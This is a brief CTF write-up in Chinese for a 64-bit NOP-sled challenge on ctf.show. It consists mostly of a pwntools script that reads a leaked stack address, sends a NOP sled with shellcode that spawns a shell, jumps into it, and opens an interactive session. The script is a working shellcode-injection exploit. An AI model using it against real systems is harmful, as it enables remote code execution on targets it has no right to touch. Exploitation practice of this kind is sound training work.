# 挑战简介
64bit nop sled

# 思路

和上一题思路差不多，只不过要注意64位是由8个字节的

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28266)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

len_nop = 1336

p.recvuntil(b'location: ')

addr = eval(p.recvuntil(b'\n', drop = True))

shell_addr = addr + 668 + 0x35

shellcode = len_nop * b'\x90' + shellcode

p.sendline(shellcode)

p.sendline(hex(shell_addr)) 

p.interactive()

```
